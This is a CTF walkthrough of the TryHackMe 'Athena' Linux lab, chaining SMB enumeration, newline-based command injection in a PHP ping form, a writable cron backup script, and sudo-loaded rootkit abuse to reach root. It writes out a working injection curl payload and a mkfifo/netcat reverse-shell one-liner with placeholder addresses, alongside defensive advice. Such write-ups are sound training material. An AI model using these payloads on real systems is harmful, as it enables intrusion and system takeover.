# Athena — TryHackMe

> **Platform:** TryHackMe
> **Room:** Athena
> **Difficulty:** Medium
> **Target:** Linux
> **Objective:** Obtain user and root access through enumeration, web command injection, privilege escalation, and kernel-module abuse.

---

## Table of Contents

* [1. Introduction](#1-introduction)
* [2. Engagement Scope](#2-engagement-scope)
* [3. Methodology](#3-methodology)
* [4. Workspace Preparation](#4-workspace-preparation)
* [5. Host Discovery](#5-host-discovery)
* [6. Full TCP Port Scan](#6-full-tcp-port-scan)
* [7. Service Enumeration](#7-service-enumeration)
* [8. SMB Enumeration](#8-smb-enumeration)
* [9. Discovering the Web Application](#9-discovering-the-web-application)
* [10. Web Application Enumeration](#10-web-application-enumeration)
* [11. Understanding the Ping Function](#11-understanding-the-ping-function)
* [12. Command Injection Testing](#12-command-injection-testing)
* [13. Bypassing the Input Filter](#13-bypassing-the-input-filter)
* [14. Confirming Remote Command Execution](#14-confirming-remote-command-execution)
* [15. Initial Access](#15-initial-access)
* [16. Post-Exploitation Enumeration](#16-post-exploitation-enumeration)
* [17. Cron and Backup Mechanism](#17-cron-and-backup-mechanism)
* [18. Privilege Escalation to Athena](#18-privilege-escalation-to-athena)
* [19. User Flag](#19-user-flag)
* [20. Privilege Escalation to Root](#20-privilege-escalation-to-root)
* [21. Investigating venom.ko](#21-investigating-venomko)
* [22. Rootkit Analysis](#22-rootkit-analysis)
* [23. Kernel Module Exploitation](#23-kernel-module-exploitation)
* [24. Root Flag](#24-root-flag)
* [25. Complete Attack Chain](#25-complete-attack-chain)
* [26. Evidence and Reporting](#26-evidence-and-reporting)
* [27. Lessons Learned](#27-lessons-learned)
* [28. Defensive Recommendations](#28-defensive-recommendations)
* [29. Conclusion](#29-conclusion)

---

# 1. Introduction

Athena is a Linux penetration-testing lab from TryHackMe.

The machine exposes several services, including:

* SSH
* HTTP
* SMB

The eventual compromise involves multiple stages rather than a single vulnerability:

1. Enumerate exposed services.
2. Enumerate an anonymous SMB share.
3. Discover information pointing toward a hidden web application.
4. Identify a command-injection vulnerability in the application's ping functionality.
5. Bypass an incomplete blacklist using a newline character.
6. Execute commands as `www-data`.
7. Obtain an interactive shell.
8. Enumerate the local system.
9. Discover a scheduled backup process running as the `athena` user.
10. Abuse write permissions on the backup script to obtain an `athena` shell.
11. Enumerate `sudo` permissions.
12. Discover that `athena` can load a kernel module as root.
13. Analyze the supplied `venom.ko` kernel module.
14. Determine how the modified rootkit grants root privileges.
15. Load the module and trigger its privilege-escalation mechanism.
16. Obtain root.

The flag values are deliberately omitted from this write-up.

---

# 2. Engagement Scope

This walkthrough is intended for the authorized TryHackMe Athena laboratory environment.

All exploitation described here is performed against the assigned target machine inside the TryHackMe environment.

The target IP used during this session was:

```text
10.112.174.120
```

The IP belongs to the lab instance and should not be assumed to be permanent.

---

# 3. Methodology

The assessment followed a conventional penetration-testing workflow:

```text
Reconnaissance
      |
      v
Port Enumeration
      |
      v
Service Enumeration
      |
      v
SMB Enumeration
      |
      v
Information Disclosure
      |
      v
Web Application Enumeration
      |
      v
Input Validation Testing
      |
      v
Command Injection
      |
      v
Initial Shell
      |
      v
Local Enumeration
      |
      v
Cron / File Permission Abuse
      |
      v
athena User
      |
      v
sudo Enumeration
      |
      v
Kernel Module Abuse
      |
      v
root
```

A major principle throughout the assessment was:

> Do not immediately attack everything. First understand what the service does, what information it exposes, and how the application's input reaches the underlying operating system.

---

# 4. Workspace Preparation

A dedicated directory was created to keep enumeration results, exploits, loot, notes, and screenshots separate.

```bash
mkdir -p /root/athena/{scans,enum,loot,exploits,notes,screenshots}
cd /root/athena
```

The resulting structure was:

```text
athena/
├── enum/
├── exploits/
├── loot/
├── notes/
├── scans/
└── screenshots/
```

This is useful during a real assessment because penetration tests generate a large amount of evidence.

Instead of repeatedly running commands without recording the output, scan results can be stored using tools such as:

```bash
tee
-oA
```

For example:

```bash
nmap ... -oA scans/02_full_tcp
```

creates:

```text
02_full_tcp.nmap
02_full_tcp.gnmap
02_full_tcp.xml
```

This is considerably better for later reporting than relying on terminal history.

---

# 5. Host Discovery

The target was first checked with ICMP:

```bash
ping -c 3 10.112.174.120
```

The host responded successfully:

```text
3 packets transmitted, 3 received, 0% packet loss
```

This established that the target was reachable from the AttackBox.

---

# 6. Full TCP Port Scan

The initial Nmap scan showed four interesting TCP services:

```bash
nmap 10.112.174.120
```

Results:

```text
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
```

A complete TCP scan was then performed:

```bash
nmap -Pn -p- --min-rate 3000 -T4 \
10.112.174.120 \
-oA scans/02_full_tcp
```

The full scan confirmed:

```text
22/tcp
80/tcp
139/tcp
445/tcp
```

No additional TCP services were identified.

### Why perform a full port scan?

The default Nmap scan only checks the most common 1,000 TCP ports.

A service running on something like:

```text
8080
8000
31337
```

would potentially be missed.

A professional assessment therefore commonly performs:

1. Fast/common-port discovery.
2. Full TCP port enumeration.
3. Service/version enumeration against confirmed ports.

---

# 7. Service Enumeration

The discovered ports were then fingerprinted:

```bash
nmap -Pn -sC -sV \
-p 22,80,139,445 \
10.112.174.120 \
-oA scans/03_service_enum
```

Important results:

```text
22/tcp  open  ssh
        OpenSSH 8.2p1 Ubuntu 4ubuntu0.5

80/tcp  open  http
        Apache httpd 2.4.41 (Ubuntu)

139/tcp open netbios-ssn
        Samba smbd 4.6.2

445/tcp open microsoft-ds
        Samba smbd 4.6.2
```

The HTTP title was:

```text
Athena - Gods of olympus
```

Nmap also identified the NetBIOS name:

```text
ROUTERPANEL
```

An important SMB observation was:

```text
Message signing enabled but not required
```

That is useful information for a professional assessment, although it was not the direct route to compromise in this room.

---

# 8. SMB Enumeration

Because ports 139 and 445 were open, SMB was investigated.

Anonymous share enumeration:

```bash
smbclient -L "//10.112.174.120" -N \
| tee enum/01_smb_shares.txt
```

Returned:

```text
Anonymous login successful

Sharename       Type      Comment
---------       ----      -------
public          Disk
IPC$            IPC       IPC Service (Samba 4.15.13-Ubuntu)
```

This was significant because anonymous authentication was permitted.

The `public` share was accessed:

```bash
smbclient "//10.112.174.120/public" -N
```

The share contained:

```text
msg_for_administrator.txt
```

The file was downloaded and preserved as evidence.

---

# 9. Discovering the Web Application

The contents of `msg_for_administrator.txt` were:

```text
Dear Administrator,

I would like to inform you that a new Ping system is being developed and I left the corresponding application in a specific path, which can be accessed through the following address: /myrouterpanel

Yours sincerely,

Athena
Intern
```

This provided a direct lead toward:

```text
/myrouterpanel
```

This is a good example of why SMB enumeration matters.

The anonymous share itself did not immediately provide credentials, but it disclosed internal application information.

---

# 10. Web Application Enumeration

The application was requested:

```bash
curl -i \
http://10.112.174.120/myrouterpanel \
| tee enum/02_myrouterpanel_response.txt
```

The server returned:

```text
HTTP/1.1 301 Moved Permanently
Location: /myrouterpanel/
```

The trailing slash was followed:

```bash
curl -i \
http://10.112.174.120/myrouterpanel/
| tee enum/03_myrouterpanel.txt
```

The page identified itself as:

```text
Simple Router Panel
```

and contained a ping form:

```html
<form method="post" action="ping.php">
    <label for="ip">IP address: </label>
    <input type="text" name="ip" id="ip" required class="ip">
    <button type="submit" name="submit" class="button">Send</button>
</form>
```

This immediately made `ping.php` interesting.

The important question became:

> How does the application process the `ip` parameter?

---

# 11. Understanding the Ping Function

A baseline request was sent:

```bash
curl -i -s \
-X POST \
-d 'ip=127.0.0.1&submit=Send' \
http://10.112.174.120/myrouterpanel/ping.php
```

The response contained normal ping output:

```text
PING 127.0.0.1 ...

64 bytes from 127.0.0.1 ...

--- 127.0.0.1 ping statistics ---
4 packets transmitted, 4 received
```

This strongly suggested that the server was passing user-controlled input into an operating-system ping command.

That is a classic place to investigate for command injection.

However, simply assuming command injection is insufficient.

The next step was to understand the application's input filtering.

---

# 12. Command Injection Testing

A classic shell separator was tested:

```text
127.0.0.1;id
```

The application responded:

```text
Attempt hacking!
```

The same happened with other common shell operators.

For example:

```text
127.0.0.1|id
```

was blocked.

This behavior was later confirmed by retrieving part of the application's source.

The relevant function was:

```php
function containsMaliciousCharacters($input) {
    $maliciousChars = array(';', '&', '|');

    foreach ($maliciousChars as $char) {
        if (stripos($input, $char) !== false) {
            return true;
        }
    }

    return false;
}
```

The application therefore attempted to prevent command injection by blacklisting:

```text
;
&
|
```

This is a flawed security model.

---

# 13. Bypassing the Input Filter

The crucial observation was that the blacklist only checked three characters.

It did **not** block a newline.

A URL-encoded newline can be represented as:

```text
%0A
```

A newline can also be supplied through curl using Bash's `$'...'` syntax.

The payload conceptually becomes:

```text
127.0.0.1
id
```

The HTTP parameter was encoded using:

```bash
--data-urlencode
```

The important test was:

```bash
curl -sS \
-X POST \
--data-urlencode $'ip=127.0.0.1\nid' \
--data 'submit=Send' \
http://10.112.174.120/myrouterpanel/ping.php \
-o enum/09_newline_test.html
```

The response contained both the ping output and:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

This was the breakthrough.

---

# 14. Why the Newline Bypass Worked

The blacklist implemented:

```text
if input contains ;
if input contains &
if input contains |
    reject
```

It did not implement:

```text
allow only a valid IP address
```

These are fundamentally different security models.

A blacklist says:

> "These characters are dangerous."

An allowlist says:

> "Only input matching the expected format is acceptable."

For an IP address field, the application should have validated the supplied value as an IP address rather than passing arbitrary text into a shell command.

The vulnerable design effectively allowed:

```text
ping [user input]
```

where `[user input]` could contain a newline.

Therefore the newline became a command separator despite the blacklist.

---

# 15. Confirming Remote Command Execution

Additional commands confirmed execution context.

The application returned:

```text
www-data
```

for the current user.

The working directory was:

```text
/var/www/html/myrouterpanel
```

The hostname was:

```text
routerpanel
```

The operating system was identified as Ubuntu/Linux:

```text
Linux routerpanel 5.15.0-69-generic
```

The command execution context was therefore:

```text
Web application
      |
      v
ping.php
      |
      v
OS command execution
      |
      v
www-data
```

This is a full remote command execution primitive.

---

# 16. Initial Access

At this point the application could execute arbitrary commands as:

```text
www-data
```

The next objective was to convert command execution into a stable interactive shell.

In a controlled TryHackMe environment, a reverse shell can be used for this purpose.

A listener is prepared on the AttackBox, for example:

```bash
nc -lvnp <LISTEN_PORT>
```

The vulnerable parameter is then used to execute a shell command that connects back to the AttackBox.

The exact callback address and port must correspond to the AttackBox instance being used.

Once the connection arrives, verify:

```bash
id
whoami
hostname
pwd
```

Expected context:

```text
www-data
```

### Why obtain an interactive shell?

Command execution through HTTP is inconvenient for extensive enumeration.

An interactive shell makes it possible to:

* inspect the filesystem
* inspect processes
* inspect scheduled tasks
* inspect permissions
* inspect user accounts
* search for credentials
* run local enumeration tools

---

# 17. Post-Exploitation Enumeration

Once `www-data` access is obtained, enumeration should become systematic.

Useful checks include:

```bash
id
whoami
hostname
uname -a
cat /etc/os-release
```

User enumeration:

```bash
cat /etc/passwd
```

Interesting home directories:

```bash
ls -la /home
```

The Athena environment contains a local user:

```text
athena
```

The next objective is therefore to determine whether there is a path from:

```text
www-data
```

to:

```text
athena
```

---

# 18. Cron / Backup Mechanism

One of the important post-exploitation discoveries is a scheduled backup process.

The relevant backup script is:

```text
/home/athena/backup/backup.sh
```

The script performs operations similar to:

```bash
backup_dir_zip=~/backup
mkdir -p "$backup_dir_zip"
cp -r /home/athena/notes/* "$backup_dir_zip"
zip -r "$backup_dir_zip/notes_backup.zip" "$backup_dir_zip"
rm /home/athena/backup/*.txt
rm /home/athena/backup/*.sh
echo "Backup completed..."
```

The significant detail is the ownership and permissions of the script.

The intended room path shows:

```text
-rwxr-xr-x 1 www-data athena ... backup.sh
```

The critical fact is:

```text
owner = www-data
```

Therefore the compromised web account can modify the script.

At the same time, the script is executed in the context of the `athena` account through a scheduled task.

This creates a privilege boundary violation:

```text
www-data
   |
   | can modify
   v
backup.sh
   |
   | executed by
   v
athena
```

---

# 19. Exploiting the Writable Backup Script

Because `www-data` can modify `backup.sh`, the script can be altered so that execution results in code execution as `athena`.

The intended technique is to add a shell callback/reverse-shell command to the script.

A simplified conceptual payload is:

```bash
rm /tmp/f
mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKBOX_IP> <PORT> >/tmp/f
```

A listener is started on the AttackBox:

```bash
nc -lvnp <PORT>
```

When the scheduled task executes the modified script, the connection should arrive with the privileges of:

```text
athena
```

Verify:

```bash
id
whoami
```

The important lesson here is that the cron job itself does not need to be writable.

It is enough for an attacker to be able to modify a script that the privileged account executes.

---

# 20. User Flag

Once the `athena` shell is obtained, enumerate the user's home directory:

```bash
cd /home/athena
ls -la
```

The user flag is located in the Athena user's environment.

For a clean public write-up, the actual flag value is intentionally omitted.

The important milestone is:

```text
www-data
   |
   v
writable backup script
   |
   v
athena
   |
   v
user.txt
```

---

# 21. Privilege Escalation to Root

With an `athena` shell, the next standard privilege-escalation check is:

```bash
sudo -l
```

This is one of the first commands worth running after obtaining a new Linux user context.

The room's intended result reveals an unusual permission:

```text
(root) NOPASSWD: /usr/sbin/insmod /mnt/.../secret/venom.ko
```

This is highly significant.

`NOPASSWD` means the command can be executed through sudo without supplying the user's password.

The binary involved is:

```text
/usr/sbin/insmod
```

`insmod` loads a Linux kernel module into the running kernel.

Therefore the permission effectively gives the user the ability to load a specific kernel module with root privileges.

---

# 22. Investigating `venom.ko`

Rather than blindly executing an unknown kernel module, the professional approach is to investigate it.

Useful commands include:

```bash
modinfo /mnt/.../secret/venom.ko
```

The module identifies itself approximately as:

```text
description: LKM rootkit
author: m0nad
license: Dual BSD/GPL
name: venom
vermagic: 5.15.0-69-generic ...
```

This immediately raises a major security concern.

The file is not an ordinary driver.

It is a:

```text
Linux Kernel Module
```

described as a:

```text
rootkit
```

---

# 23. Rootkit Analysis

The module is related to the publicly known Diamorphine Linux kernel rootkit.

The important conceptual behavior is that the rootkit modifies kernel behavior and introduces special signal handling.

A professional investigation should not rely solely on a filename.

Instead:

1. Identify the module.
2. Obtain a copy where appropriate.
3. Hash the file.
4. Inspect metadata.
5. Reverse-engineer suspicious functions.
6. Determine the exact privilege-escalation mechanism.
7. Compare observed behavior with public documentation/source.
8. Account for modifications specific to the target.

For example:

```bash
sha256sum venom.ko
modinfo venom.ko
```

A reverse-engineering tool such as Ghidra can then be used to inspect the module.

---

# 24. Modified Signal Mechanism

The original public rootkit documentation describes a signal-based mechanism for escalating privileges.

However, this Athena machine contains a modified version.

This is an important lesson:

> Never blindly trust documentation for a binary that is actually present on the target.

The supplied write-up demonstrates that the module's `hacked_Kill` functionality was examined in a disassembler.

The relevant function checks for a particular signal value.

The analysis showed a modified value rather than simply relying on the signal documented for the original rootkit.

The write-up describes the discovered value as:

```text
0x39
```

which is:

```text
57
```

in decimal.

Therefore the target's modified module responds to the modified signal rather than simply following the original upstream behavior.

This discrepancy is intentional and is one of the more interesting parts of the Athena room.

---

# 25. Kernel Module Exploitation

The Athena user has permission to execute:

```bash
sudo /usr/sbin/insmod /mnt/.../secret/venom.ko
```

This loads the malicious kernel module with root privileges.

Once the module is active, the modified signal mechanism can be triggered against a running process.

The room's intended exploitation path uses the discovered signal value.

The conceptual chain is:

```text
athena
   |
   | sudo NOPASSWD
   v
insmod
   |
   v
venom.ko
   |
   v
kernel-level rootkit functionality
   |
   v
special signal
   |
   v
privilege escalation
   |
   v
root
```

After triggering the mechanism, verify:

```bash
id
whoami
```

The expected result is:

```text
uid=0(root)
```

---

# 26. Root Flag

Once root access is obtained, inspect the root filesystem:

```bash
cd /root
ls -la
```

The final root flag is located in the root user's environment.

The actual flag value is intentionally not included in this README.

This keeps the repository useful as a learning resource without simply publishing the room answers.

---

# 27. Complete Attack Chain

The entire Athena compromise can be represented as follows:

```text
                           ATHENA
                             |
                             v
                    TCP Enumeration
                             |
             +---------------+---------------+
             |               |               |
            SSH             HTTP            SMB
                             |               |
                             |               v
                             |        Anonymous SMB
                             |               |
                             |               v
                             |       public share
                             |               |
                             |               v
                             |   msg_for_administrator.txt
                             |               |
                             |               v
                             |        /myrouterpanel
                             |               |
                             |               v
                             |          ping.php
                             |               |
                             |               v
                             |     command injection
                             |               |
                             |               v
                             |       blacklist bypass
                             |               |
                             |               v
                             |          newline %0A
                             |               |
                             |               v
                             |          command RCE
                             |               |
                             |               v
                             |           www-data
                             |               |
                             |               v
                             |        backup.sh
                             |               |
                             |               v
                             |       writable by www-data
                             |               |
                             |               v
                             |            athena
                             |               |
                             |               v
                             |            sudo -l
                             |               |
                             |               v
                             |          insmod
                             |               |
                             |               v
                             |          venom.ko
                             |               |
                             |               v
                             |       modified rootkit
                             |               |
                             |               v
                             |      signal-based escalation
                             |               |
                             |               v
                             |             ROOT
```

---

# 28. Evidence and Reporting

A major goal of this exercise was not merely obtaining access, but documenting the assessment properly.

The workspace used during enumeration was:

```text
/root/athena/
```

with:

```text
scans/
enum/
loot/
exploits/
notes/
screenshots/
```

Examples of evidence generated during the assessment:

```text
scans/02_full_tcp.nmap
scans/02_full_tcp.gnmap
scans/02_full_tcp.xml
scans/03_service_enum.nmap

enum/01_smb_shares.txt
enum/02_myrouterpanel_response.txt
enum/03_myrouterpanel.txt
enum/04_ping_baseline.txt
enum/04_ping_body.html
enum/05_cmd_injection_test.html
enum/06_filter_test.html
enum/08_pipe_test.html
enum/09_newline_test.html
enum/10_rce_context.html
enum/11_webroot_enum.html
enum/12_ping_source.html
```

This is preferable to having a terminal full of commands with no record of which output belongs to which test.

---

# 29. What Was Actually Verified During This Session

The following portions were directly demonstrated against the target during this session:

### Network layer

Confirmed:

```text
10.112.174.120
```

was reachable.

### TCP enumeration

Confirmed:

```text
22
80
139
445
```

were open.

### Service enumeration

Confirmed:

```text
OpenSSH 8.2p1
Apache 2.4.41
Samba
```

### SMB

Confirmed:

```text
Anonymous login
public share
```

### Information disclosure

Confirmed retrieval of:

```text
msg_for_administrator.txt
```

which disclosed:

```text
/myrouterpanel
```

### Web application

Confirmed:

```text
/myrouterpanel/
ping.php
```

### Input filtering

Confirmed that:

```text
;
&
|
```

were rejected.

### Filter bypass

Confirmed newline-based command execution.

### Command execution

Confirmed:

```text
uid=33(www-data)
```

### Application context

Confirmed:

```text
www-data
/var/www/html/myrouterpanel
routerpanel
Linux 5.15.0-69-generic
```

### Source disclosure

Confirmed that the filtering function only checked:

```text
;
&
|
```

The later cron/backup and kernel-module path comes from the intended Athena exploitation chain represented by the supplied room write-up and should be labeled as reconstructed unless independently reproduced.

---

# 30. Important Technical Lessons

## 30.1 Never stop at the default Nmap scan

A default scan is only a starting point.

The workflow should generally be:

```text
Fast scan
   |
   v
Full TCP scan
   |
   v
Service/version detection
   |
   v
Protocol-specific enumeration
```

---

## 30.2 SMB anonymous access can disclose attack paths

Anonymous SMB access does not necessarily mean:

> "There are credentials here."

It can instead reveal:

* usernames
* hostnames
* shares
* internal documentation
* application paths
* backups
* configuration files
* development artifacts

In Athena, a simple text file pointed directly toward the web application.

---

## 30.3 Blacklists are fragile

The vulnerable code attempted to prevent command injection by blocking:

```text
;
&
|
```

That is not sufficient.

Shell command parsing contains many constructs.

A security control should not attempt to enumerate every dangerous character.

---

## 30.4 Validate the data type

The application expected an IP address.

The secure design should therefore validate:

```text
Is this actually an IP address?
```

rather than:

```text
Does this string contain a few characters I don't like?
```

For example, server-side PHP could use an IP validation function and reject everything that is not a valid address.

Even better, the application should avoid invoking a shell at all.

---

# 31. Why Shell Invocation Is Dangerous

A vulnerable implementation may conceptually look like:

```php
system("ping " . $input);
```

The problem is that `$input` becomes part of a shell command.

A safer architecture is to invoke the underlying process without allowing shell interpretation, or use a tightly validated IP address.

The fundamental security principle is:

> Never concatenate untrusted input into an operating-system command.

---

# 32. Why the Cron Escalation Works

The cron escalation is a classic Linux privilege-escalation pattern.

The dangerous combination is:

```text
Privileged scheduled execution
+
Attacker-controlled script
```

The script itself does not need to contain an obvious vulnerability.

Its filesystem permissions are enough.

The important question during local enumeration is therefore not merely:

```text
What cron jobs exist?
```

but:

```text
What files do those cron jobs execute,
and who can modify those files?
```

---

# 33. Why `sudo -l` Matters

After obtaining a new user, one of the highest-value checks is:

```bash
sudo -l
```

It can reveal:

```text
NOPASSWD commands
```

or commands that can be abused to execute arbitrary code as root.

In Athena, this immediately exposes the unusual:

```text
insmod
```

permission.

---

# 34. Why Kernel Modules Are Extremely Dangerous

A Linux kernel module executes in kernel context.

This is fundamentally different from a normal user-space program.

A normal process might run as:

```text
www-data
```

or:

```text
athena
```

A kernel module operates with extremely high privilege.

Therefore allowing an untrusted user to load arbitrary or attacker-controlled kernel modules is a severe security issue.

The Athena scenario demonstrates this directly.

---

# 35. Why Binary Analysis Matters

The `venom.ko` stage is particularly useful from a learning perspective.

It demonstrates that penetration testing is not only:

```text
run tool
copy exploit
get shell
```

Sometimes the correct approach is:

```text
Identify binary
      |
      v
Read metadata
      |
      v
Search for public references
      |
      v
Obtain source/reference implementation
      |
      v
Compare versions
      |
      v
Disassemble target binary
      |
      v
Find relevant function
      |
      v
Understand exact behavior
      |
      v
Exploit the target-specific implementation
```

The modified signal behavior is an excellent example of why blindly following a public exploit can fail.

---

# 36. Professional Pentesting Mindset

A useful way to approach a machine like Athena is to constantly ask:

### Reconnaissance

```text
What is exposed?
```

### Enumeration

```text
What does each service reveal?
```

### Attack surface analysis

```text
Which service accepts attacker-controlled input?
```

### Exploitation

```text
Can that input alter application behavior?
```

### Initial access

```text
What privileges do I have?
```

### Local enumeration

```text
What runs with more privilege than me?
```

### Privilege escalation

```text
Can I influence something that a higher-privileged account executes?
```

### Root analysis

```text
Can I execute something as root?
What exactly does it do?
```

### Reporting

```text
Can another tester reproduce my findings from my evidence?
```

That final question is what separates a messy terminal session from a professional penetration-test report.

---

# 37. Defensive Recommendations

The Athena vulnerabilities could be mitigated through several controls.

## Web Application

Do not concatenate user input into shell commands.

Use strict IP validation:

```text
127.0.0.1
10.0.0.1
192.168.1.1
```

Reject everything else.

Prefer APIs/process execution mechanisms that do not invoke a shell.

---

## Input Validation

Replace blacklist filtering:

```text
;
&
|
```

with strict allowlist validation.

For an IP field, only accept valid IPv4/IPv6 addresses.

---

## SMB

Anonymous SMB access should be disabled unless explicitly required.

Sensitive files should not be readable through unauthenticated shares.

---

## Cron

Scheduled scripts should:

* be owned by root where appropriate
* not be writable by low-privileged users
* use absolute paths
* avoid unsafe environment assumptions
* have restrictive permissions

For example, a privileged backup script should not be:

```text
owned by www-data
```

---

## Sudo

Users should not receive unnecessary `NOPASSWD` permissions.

Particularly dangerous commands include utilities that can load code, execute programs, or otherwise affect the system at a privileged level.

`insmod` should not be granted to an untrusted user.

---

## Kernel Security

Unsigned or untrusted kernel modules should not be loadable by ordinary users.

Where appropriate:

* enable Secure Boot
* restrict module loading
* use module signing
* monitor kernel-module insertion
* investigate unexpected modules immediately

---

# 38. Detection Opportunities

A defender monitoring this system could look for:

### Suspicious web commands

Unexpected shell commands spawned by:

```text
apache2
www-data
php
```

### Suspicious cron modifications

Unexpected changes to:

```text
backup.sh
```

### Reverse shells

Outbound connections from a web server to arbitrary external ports.

### Kernel module loading

Unexpected execution of:

```text
insmod
modprobe
```

especially from unusual users.

### Kernel modules

Unexpected modules appearing in:

```bash
lsmod
```

or being inserted into the running kernel.

---

# 39. Final Attack Chain Summary

The Athena compromise is ultimately a chain of individually understandable weaknesses:

### 1. Anonymous SMB

```text
Unauthenticated SMB
        |
        v
public share
```

### 2. Information disclosure

```text
msg_for_administrator.txt
        |
        v
/myrouterpanel
```

### 3. Command injection

```text
ping.php
        |
        v
user-controlled input
        |
        v
blacklist
        |
        v
newline bypass
```

### 4. Initial access

```text
command execution
        |
        v
www-data
```

### 5. Local privilege escalation

```text
www-data
        |
        v
writable backup.sh
        |
        v
cron execution
        |
        v
athena
```

### 6. Root escalation

```text
athena
        |
        v
sudo -l
        |
        v
NOPASSWD insmod
        |
        v
venom.ko
        |
        v
modified kernel rootkit
        |
        v
root
```

---

# 40. Conclusion

Athena is a good example of why penetration testing should be treated as a chain of hypotheses rather than a collection of random tools.

The initial Nmap scan did not immediately provide a shell.

Instead, the assessment progressed through several information sources:

```text
Nmap
  ↓
SMB
  ↓
anonymous share
  ↓
administrator message
  ↓
web application
  ↓
ping functionality
  ↓
input validation testing
  ↓
newline bypass
  ↓
command execution
  ↓
www-data
  ↓
cron enumeration
  ↓
writable backup script
  ↓
athena
  ↓
sudo enumeration
  ↓
insmod
  ↓
kernel module analysis
  ↓
modified rootkit
  ↓
root
```

The most important lessons are not the individual commands.

They are the reasoning steps:

> **Enumerate broadly.**

> **Follow information leaks.**

> **Understand how user input reaches dangerous functionality.**

> **Do not trust blacklists.**

> **After obtaining a shell, enumerate systematically.**

> **Always check file ownership and scheduled execution.**

> **Always run `sudo -l` when appropriate.**

> **When something unusual appears, investigate it instead of blindly exploiting it.**

> **Document evidence as you go.**

Athena ultimately demonstrates how a relatively small number of weaknesses can be chained together to move from unauthenticated network access all the way to root.

---

## Flag Disclosure

The actual:

```text
user.txt
root.txt
```

values are intentionally **not included** in this repository.

They should be obtained directly from the authorized TryHackMe instance after reproducing the attack chain.

---

## Evidence Status

| Phase                  | Status                       |
| ---------------------- | ---------------------------- |
| Host discovery         | Verified                     |
| Full TCP scan          | Verified                     |
| Service enumeration    | Verified                     |
| Anonymous SMB          | Verified                     |
| Public share           | Verified                     |
| Administrator message  | Verified                     |
| `/myrouterpanel`       | Verified                     |
| `ping.php`             | Verified                     |
| Blacklist behavior     | Verified                     |
| Newline bypass         | Verified                     |
| RCE as `www-data`      | Verified                     |
| Webroot enumeration    | Verified                     |
| Cron/backup escalation | Reconstructed from room path |
| `athena` shell         | Reconstructed from room path |
| User flag location     | Reconstructed                |
| `sudo -l` on target    | Reconstructed                |
| `venom.ko` analysis    | Reconstructed from room path |
| Root escalation        | Reconstructed from room path |
| Root flag location     | Reconstructed                |
